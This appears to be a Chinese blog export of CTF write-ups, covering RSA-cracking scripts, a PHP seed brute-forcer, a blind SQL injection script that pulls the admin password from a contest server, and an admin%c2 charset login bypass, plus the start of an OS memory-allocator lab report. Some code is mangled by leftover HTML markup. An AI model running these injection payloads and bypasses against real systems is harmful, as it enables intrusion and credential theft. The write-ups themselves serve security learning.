贴出破解脚本：#coding=utf-8import sys;sys.setrecursionlimit(100000);def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(‘modular inverse does not exist’) else: return x % mdef main(): n= x e1= x e2= x c1= x c2= x s = egcd(e1, e2) s1 = s[1] s2 = s[2] # 求模反元素 if s1&lt;0: s1 = - s1 c1 = modinv(c1, n) elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n) m = (pow(c1,s1,n)pow(c2,s2,n))%n print mif name == ‘main‘: main()0x03 RSA题目0x1 veryeasyRSA已知RSA公钥生成参数： p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 求d = 请提交PCTF{d} 直接写py脚本from libnum import invmodp = 3487583947589437589237958723892346254777q = 8767867843568934765983476584376578389e = 65537fn = (p-1)(q-1)d = invmod(e,fn)print d0x2 Easy RSA还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。 已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥： (N=322831561921859 e = 23) 请解密出明文，提交时请将数字转化为ascii码提交 比如你解出的明文是0x6162，那么请提交字符串ab首先利用在线分解工具分解大整数 N = 13574881 23781539 利用脚本解密 注意要写一个快速计算的额脚本# coding = utf-8import libnumdef fastExpMod(b, e, m): “”” e = e0(2^0) + e1(2^1) + e2(2^2) + … + en (2^n) b^e = b^(e0(2^0) + e1(2^1) + e2(2^2) + … + en (2^n)) = b^(e0(2^0)) b^(e1(2^1)) b^(e2(2^2)) … b^(en(2^n)) b^e mod m = ((b^(e0(2^0)) mod m) (b^(e1(2^1)) mod m) (b^(e2(2^2)) mod m) … (b^(en(2^n)) mod m) mod m “”” result = 1 while e != 0: if (e&amp;1) == 1: # ei = 1, then mul result = (result b) % m e &gt;&gt;= 1 # b, b^2, b^4, b^8, … , b^(2^n) b = (bb) % m return resultdef decryption(C, d, n): #RSA M = C^d mod n return fastExpMod(C, d, n)p = 13574881q = 23781539n = p qfn = (p - 1) (q - 1)e = 23d = libnum.invmod(e,fn)print dC = int(‘0xdc2eeeb2782c’, 16)M = decryption(C, d, n)flag = str(hex(M))[2:-1]print flag.decode(‘hex’)0x3 Medium RSA首先利用openssl 生成n eroot@kali:/media/sf_vboxshare/mediumRSA# openssl rsa -pubin -text -modulus -in pubkey.pemPublic-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key—–BEGIN PUBLIC KEY—–MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=其中Exponent即为e值，Modulus即为N值，用yafu分解。 N = 87924348264132406875276140514499937145050893665602592992418171647042491658461 factor(87924348264132406875276140514499937145050893665602592992418171647042491658461)得到p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 d = 10866948760844599168252082612378495977388271279679231539839049698621994994673利用python生成秘钥# coding=utf-8import mathimport sysfrom Crypto.PublicKey import RSAkeypair = RSA.generate(1024)keypair.p = 275127860351348928173285174381581152299keypair.q = 319576316814478949870590164193048041239keypair.e = 65537keypair.n = keypair.p keypair.qQn = long((keypair.p-1) (keypair.q-1))i = 1while (True): x = (Qn * i ) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1private = open(‘private.pem’,‘w’)private.write(keypair.exportKey())private.close()然后直接用私钥解密。root@kali:/media/sf_vboxshare/mediumRSA# openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.decroot@kali:/media/sf_vboxshare/mediumRSA# cat flag.decPCTF{256b_i5_m3dium}]]></content>
      <tags>
        <tag>密码学应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 陕西省网络安全技术比赛 Writeup]]></title>
    <url>%2F2017%2F04%2F17%2F2017%20%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%AF%94%E8%B5%9B%20Writeup%2F</url>
    <content type="text"><![CDATA[这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。0x01 签到题首先看源码 常见的类型，可以见以前写的博客 直接弱类型比较 Username=QNKCDZO&amp;password=240610708 接着继续看源码 直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 {‘key’:0} 0x02 抽抽奖一道简单的js调试题目 首先找点击触发事件 这次比赛觉得质量挺高的，至少找到了很多盲点，要学习的东西还非常多。0x01 签到题首先看源码 常见的类型，可以见以前写的博客 直接弱类型比较 Username=QNKCDZO&amp;password=240610708 接着继续看源码 直接生成一个json格式的东西发过去就ok 试了好多遍才找到key=0 {‘key’:0} 0x02 抽抽奖一道简单的js调试题目 首先找点击触发事件 找到之后下断点，点击按钮，单步调试 在有弹窗的函数出下断点步入 0x03 Wrong一个备份文件泄露的题目，找到备份文件.index.php.swp 利用vim -r index.php.swp还原&lt;?phperror_reporting(0);function create_password($pw_length = 10){$randpwd = “”;for ($i = 0; $i &lt; $pw_length; $i++){$randpwd .= chr(mt_rand(33, 126));}return $randpwd;}session_start();mt_srand(time());$pwd=create_password();if($pwd==$_GET[‘pwd’]){ if($_SESSION[‘userLogin’]==$_GET[‘login’]) echo “Good job, you get the key”;}else{echo “Wrong!”;}$_SESSION[‘userLogin’]=create_password(32).rand();?&gt;考点很清楚 爆破种子，以前有类似的题目，附上链接 分析一下逻辑可以得到，第一个随机数mt_srand可以用时间种子暴力破解 第二个rand可以利用弱类型比较绕过 左后附上代码&lt;?phpfunction create_password($pw_length = 10){$randpwd = “”;for ($i = 0; $i &lt; $pw_length; $i++){$randpwd .= chr(mt_rand(33, 126));}return $randpwd;}//$cookie_file = dirname(FILE).’/cookie.txt’;//使用上面保存的cookies再次访问$i = 80;$time = time();while($i–){mt_srand($time+$i);echo time();echo ‘hhh’;echo $time+$i;$s = create_password();$url = “http://117.34.111.15:85/index.php?pwd=$s&amp;login=“;$ch = curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);//curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file); //使用上面获取的cookies//curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file); //存储cookies$response = curl_exec($ch);curl_close($ch);echo $response;}?&gt;0x04 so easy!这道题挺不错的，学到了很多新姿势 首先看源码 &lt;?phpinclude(“config.php”);$conn -&gt;query(“set names utf8”);function randStr($lenth=32){ $strBase = “1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm”; $str = “”; while($lenth&gt;0){ $str.=substr($strBase,rand(0,strlen($strBase)-1),1); $lenth –; } return $str;}if($install){ $sql = “create table user ( id int(10) unsigned NOT NULL PRIMARY KEY AUTO_INCREMENT , username varchar(30) NOT NULL, passwd varchar(32) NOT NULL, role varchar(30) NOT NULL )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci “; if($conn-&gt;query($sql)){ $sql = “insert into user(username,passwd,role) values (‘admin’,’”.md5(randStr()).“‘,’admin’)”; $conn -&gt; query($sql); }}function filter($str){ $filter = “/ |*|#|;|,|is|union|like|regexp|for|and|or|file|–||||&amp;amp;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&#39;%09&#39;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&quot;%0a&quot;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&quot;%0b&quot;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&#39;%0c&#39;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&#39;%0d&#39;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;|&quot;&lt;/span&gt;.urldecode(&lt;span class=&quot;hljs-string&quot;&gt;&#39;%a0&#39;&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;/i&quot;&lt;/span&gt;; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;hljs-variable&quot;&gt;$filter&lt;/span&gt;,&lt;span class=&quot;hljs-variable&quot;&gt;$str&lt;/span&gt;)){ &lt;span class=&quot;hljs-keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;you can&#39;t input this illegal char!&quot;&lt;/span&gt;); } &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$str&lt;/span&gt;; } &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;)&lt;/span&gt;{&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt;; &lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;select role fromuserwhere username =&#39;&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;.&lt;span class=&quot;hljs-string&quot;&gt;&quot;&#39;&quot;&lt;/span&gt;; &lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt; = &lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt; -&amp;gt;query(&lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt;); &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt;-&amp;gt;num_rows&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;){ &lt;span class=&quot;hljs-keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;$username is &quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt;-&amp;gt;fetch_assoc()[&lt;span class=&quot;hljs-string&quot;&gt;&#39;role&#39;&lt;/span&gt;]; }&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{ &lt;span class=&quot;hljs-keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Don&#39;t have this user!&quot;&lt;/span&gt;); } } &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;,&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt;)&lt;/span&gt;{&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt;; &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$flag&lt;/span&gt;; &lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt; = trim(strtolower(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;)); &lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt; = trim(strtolower(&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt;)); &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt; == &lt;span class=&quot;hljs-string&quot;&gt;&#39;admin&#39;&lt;/span&gt;){ &lt;span class=&quot;hljs-keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;you can&#39;t login this as admin!&quot;&lt;/span&gt;); } &lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;select * fromuserwhere username=&#39;&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt;-&amp;gt;escape_string(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;&#39; and passwd=&#39;&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt;-&amp;gt;escape_string(&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt;).&lt;span class=&quot;hljs-string&quot;&gt;&quot;&#39;&quot;&lt;/span&gt;; &lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt; = &lt;span class=&quot;hljs-variable&quot;&gt;$conn&lt;/span&gt; -&amp;gt;query(&lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt;); &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt;-&amp;gt;num_rows&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;){ &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$res&lt;/span&gt;-&amp;gt;fetch_assoc()[&lt;span class=&quot;hljs-string&quot;&gt;&#39;role&#39;&lt;/span&gt;] === &lt;span class=&quot;hljs-string&quot;&gt;&#39;admin&#39;&lt;/span&gt;) &lt;span class=&quot;hljs-keyword&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$flag&lt;/span&gt;); }&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{ &lt;span class=&quot;hljs-keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;sorry,username or passwd error!&quot;&lt;/span&gt;; } } &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;{&lt;/span&gt; highlight_file(&lt;span class=&quot;hljs-keyword&quot;&gt;__FILE__&lt;/span&gt;); } &lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt; = &lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;username&#39;&lt;/span&gt;])?filter(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;username&#39;&lt;/span&gt;]):&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;; &lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt; = &lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;passwd&#39;&lt;/span&gt;])?filter(&lt;span class=&quot;hljs-variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;passwd&#39;&lt;/span&gt;]):&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;; &lt;span class=&quot;hljs-variable&quot;&gt;$action&lt;/span&gt; = &lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;action&#39;&lt;/span&gt;])?filter(&lt;span class=&quot;hljs-variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;&#39;action&#39;&lt;/span&gt;]):&lt;span class=&quot;hljs-string&quot;&gt;&quot;source&quot;&lt;/span&gt;; &lt;span class=&quot;hljs-keyword&quot;&gt;switch&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$action&lt;/span&gt;){ &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;source&quot;&lt;/span&gt;: source(); &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt; ; &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;login&quot;&lt;/span&gt; : login(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;,&lt;span class=&quot;hljs-variable&quot;&gt;$passwd&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;; &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;show&quot;&lt;/span&gt; : show(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;; } &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;需要注意以下几点 &lt;br&gt; 1.数据库不会内容变 &lt;br&gt; 2.show函数可以注入能用的字符串有select from () substr ’ &lt;br&gt; 3.show 可以盲注&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt; &lt;p&gt;盲注姿势 &lt;br&gt; 1.绕过，利用&lt;code&gt;substr(user())from(1)&lt;/code&gt; &lt;br&gt; 2.绕过空格 利用（） &lt;br&gt; 3.闭合引号，因为没有注释符所以只能用连等式 &lt;br&gt; 4.连接符选择 使用/连接&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt; &lt;p&gt;首先找到盲注点 &lt;br&gt; &lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170417170034684?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;&gt; &lt;br&gt; 写盲注脚本&lt;/br&gt;&lt;/img&gt;&lt;/br&gt;&lt;/p&gt; &lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs livecodeserver&quot;&gt;import requests &lt;span class=&quot;hljs-keyword&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;hljs-operator&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;33&lt;/span&gt;): &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; j &lt;span class=&quot;hljs-operator&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;126&lt;/span&gt;): url=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://117.34.111.15:89/?action=show&quot;&lt;/span&gt; s1 = &lt;span class=&quot;hljs-string&quot;&gt;&quot;admin&#39;/1=(ascii(substr((select(passwd)from(user))from({})))={})/&#39;1&#39;=&#39;1&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-built_in&quot;&gt;format&lt;/span&gt;(str(i),j) data = { &lt;span class=&quot;hljs-string&quot;&gt;&#39;username&#39;&lt;/span&gt;:s1 } s=requests.&lt;span class=&quot;hljs-built_in&quot;&gt;post&lt;/span&gt;(url=url,data=data) content=s.content &lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt;=&lt;span class=&quot;hljs-built_in&quot;&gt;len&lt;/span&gt;(content) print &lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt; != &lt;span class=&quot;hljs-number&quot;&gt;21&lt;/span&gt;: &lt;span class=&quot;hljs-keyword&quot;&gt;string&lt;/span&gt;+=chr(j) break print &lt;span class=&quot;hljs-keyword&quot;&gt;string&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt; &lt;p&gt;password=37b1d2f04f594bfffc826fd69e389688 &lt;br&gt; 下一步用password登录admin，但发现&lt;/br&gt;&lt;/p&gt; &lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs lasso&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;hljs-subst&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&#39;admin&#39;&lt;/span&gt;){ die(&lt;span class=&quot;hljs-string&quot;&gt;&quot;you can&#39;t login this as admin!&quot;&lt;/span&gt;); } &lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;hljs-subst&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;select * fromuser` where username=’”.$conn-&gt;escape_string($username).“‘ and passwd=’”.$conn-&gt;escape_string($passwd).“‘“;发现不能直接用admin登录 必须利用字符集特征绕过此判断 P牛的文章 就是admin%c2 在php中就不为admin，但在mysql查询的就是为admin，所以可以绕过 原因就是Mysql字段的字符集和php mysqli客户端设置的字符集不相同。Mysql在转换字符集的时候，将不完整的字符给忽略了。 0x05 继续抽这道题和第一个抽抽奖相比质量高得多。 首先经过调试发现运行机制$(function(){ var rotateFunc=function(jsctf0,jsctf1,jsctf2){ $(‘#lotteryBtn’).stopRotate(); $(“#lotteryBtn”).rotate({angle:0x0,duration:0x1388,animateTo:jsctf1+0x5a0,callback:function(){ $.get(‘get.php?token=’+$(“#token”).val()+“&amp;id=”+encode(md5(jsctf2)),function(jsctf3){alert(jsctf3[‘text’])},‘json’); $.get(‘token.php’,function(jsctf3){$(“#token”).val(jsctf3)},‘json’)}})}; $(“#lotteryBtn”).rotate({bind:{click:function(){ var jsctf0=[0x0]; jsctf0=jsctf0[Math.floor(Math.random()jsctf0.length)]; if(jsctf0==0x1){rotateFunc(0x1,157,‘1’)}; if(jsctf0==0x2){rotateFunc(0x2,0xf7,‘2’)}; if(jsctf0==0x3){rotateFunc(0x3,0x16,‘3’)}; if(jsctf0==0x0){var jsctf1=[0x43,0x70,0xca,0x124,0x151]; jsctf1=jsctf1[Math.floor(Math.random()jsctf1.length)]; rotateFunc(0x0,jsctf1,‘0’)}}}})})jsctf 分别为0,1,2,3对应无，一等，二等，三等 重点在这里$.get(‘get.php?token=’+$(“#token”).val()+”&amp;id=”+encode(md5(jsctf2)) token是本页面里的，下次发送数据需要使用，encode函数我们可通过调试得到function encode(string){ var output=‘’; for(var x=0,y=string.length,charCode,hexCode;x&lt;y;++x) { charCode=string.charCodeAt(x); if(128&gt;charCode){charCode+=128} else if(127&lt;charCode){charCode-=128} charCode=255-charCode; hexCode=charCode.toString(16); if(2&gt;hexCode.length){hexCode=‘0’+hexCode} output+=hexCode} return output}下面就用python暴力跑一下import requestsimport jsonfrom base64 import *from bs4 import BeautifulSoupdef md5(str): import hashlib m = hashlib.md5() m.update(str) return m.hexdigest()def encode(string): output=‘’; for i in string: charCode = ord(i) if 128 &gt; charCode: charCode+=128 elif 127&lt; charCode: charCode-=128 charCode=255-charCode; hexCode=hex(charCode)[2:] if 2 &gt; len(hexCode): hexCode=‘0’+hexCode output+=hexCode return outputr = requests.session()for i in range(1000): s = r.get(‘http://117.34.111.15:81/‘) soup = BeautifulSoup(s.content,‘lxml’) token = soup.input[‘value’] idt = encode(md5(str(i))) s1 = r.get(‘http://117.34.111.15:81/get.php?token=‘+token+‘&amp;id=’+idt) if ‘flag{‘ in json.loads(s1.content)[‘text’]: print json.loads(s1.content)[‘text’] break0x06 just a test直接AVWS扫描 再接着用sqlmap跑一下 发现并没有想要的字段 可以报错注入 这题想死的心都有了，浪费了好长时间 flag{99cd1872c9b26525a8e5ec878d230caf}]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统实验报告 lab2]]></title>
    <url>%2F2017%2F04%2F03%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab2%2F</url>
    <content type="text"><![CDATA[操作系统lab2 练习0：填写已有实验本实验依赖实验1。请把要做的实验1的代码填入本实验中代码有lab1的注释部分。直接利用ubuntu的开源工具meld进行比较 下面是比较的图片由meld比较可知，两个文件需要补全，直接复制即可。练习1：实现first-fit连续物理内存分配算法首先了解一下什么是first-fir内存分配算法，该算法是最先适应算法。该算法从空闲分区链首开始查找，直至找到一个能满足其大小要求的空闲分区为止。然后再按照作业的大小，从该分区中划出一块内存分配给请求者，余下的空闲分区仍留在空闲分区链中。 特点： 该算法倾向于使用内存中低地址部分的空闲区，在高地址部分的空闲区很少被利用，从而保留了高地址部分的大空闲区。显然为以后到达的大作业分配大的内存空间创造了条件。 缺点：低地址部分不断被划分，留下许多难以利用、很小的空闲区，而每次查找又都从低地址部分开始，会增加查找的开销。物理页结构属性如下struct Page { int ref; // page frame’s reference counter uint32_t flags; // array of flags that describe the status of the page frame unsigned int property; // the num of free block, used in first fit pm manager list_entry_t page_link; // free list link};对结构体中的变量进行解释：ref 表示这样页被页表的引用记数，应该就是映射此物理页的虚拟页个数。一旦某页表中有一个页表项设置了虚拟页到这个Page管理的物理页的映射关系，就会把Page的ref加一。反之，若是解除，那就减一。flags 表示此物理页的状态标记，有两个标志位，第一个表示是否被保留，如果被保留了则设为1（比如内核代码占用的空间）。第二个表示此页是否是free的。如果设置为1，表示这页是free的，可以被分配；如果设置为0，表示这页已经被分配出去了，不能被再二次分配。property 用来记录某连续内存空闲块的大小，这里需要注意的是用到此成员变量的这个Page一定是连续内存块的开始地址（第一页的地址）。page_link 是便于把多个连续内存空闲块链接在一起的双向链表指针，连续内存空闲块利用这个页的成员变量page_link来链接比它地址小和大的其他连续内存空闲块双向链表结构如下typedef struct { list_entry_t free_list; // the list header unsigned int nr_free; // # of free pages in this free list} free_area_t;物理内存页管理器顺着双向链表进行搜索空闲内存区域，直到找到一个足够大的空闲区域，这是一种速度很快的算法，因为它尽可能少地搜索链表。如果空闲区域的大小和申请分配的大小正好一样，则把这个空闲区域分配出去，成功返回;否则将该空闲区分为两部分，一部分区域与申请分配的大小相等，把它分配出去，剩下的一部分区域形成新的空闲区。其释放内存的设计思路很简单，只需把这块区域重新放回双向链表中即可。 以上是内存管理用到的两大数据结构。接下来利用这些结构完成实验。实验要求/ In the first fit algorithm, the allocator keeps a list of free blocks (known as the free list) and, on receiving a request for memory, scans along the list for the first block that is large enough to satisfy the request. If the chosen block is significantly larger than that requested, then it is usually split, and the remainder added to the list as another free block. Please see Page 196~198, Section 8.2 of Yan Wei Min’s chinese book “Data Structure – C programming language” /// LAB2 EXERCISE 1: YOUR CODE// you should rewrite functions: default_init,default_init_memmap,default_alloc_pages, default_free_pages./ Details of FFMA (1) Prepare: In order to implement the First-Fit Mem Alloc (FFMA), we should manage the free mem block use some list. The struct free_area_t is used for the management of free mem blocks. At first you should be familiar to the struct list in list.h. struct list is a simple doubly linked list implementation. You should know howto USE: list_init, list_add(list_add_after), list_add_before, list_del, list_next, list_prev Another tricky method is to transform a general list struct to a special struct (such as struct page): you can find some MACRO: le2page (in memlayout.h), (in future labs: le2vma (in vmm.h), le2proc (in proc.h),etc.) (2) default_init: you can reuse the demo default_init fun to init the free_list and set nr_free to 0. free_list is used to record the free mem blocks. nr_free is the total number for free mem blocks. (3) default_init_memmap: CALL GRAPH: kern_init –&gt; pmm_init–&gt;page_init–&gt;init_memmap–&gt; pmm_manager-&gt;init_memmap This fun is used to init a free block (with parameter: addr_base, page_number). First you should init each page (in memlayout.h) in this free block, include: p-&gt;flags should be set bit PG_property (means this page is valid. In pmm_init fun (in pmm.c), the bit PG_reserved is setted in p-&gt;flags) if this page is free and is not the first page of free block, p-&gt;property should be set to 0. if this page is free and is the first page of free block, p-&gt;property should be set to total num of block. p-&gt;ref should be 0, because now p is free and no reference. We can use p-&gt;page_link to link this page to free_list, (such as: list_add_before(&amp;free_list, &amp;(p-&gt;page_link)); ) Finally, we should sum the number of free mem block: nr_free+=n (4) default_alloc_pages: search find a first free block (block size &gt;=n) in free list and reszie the free 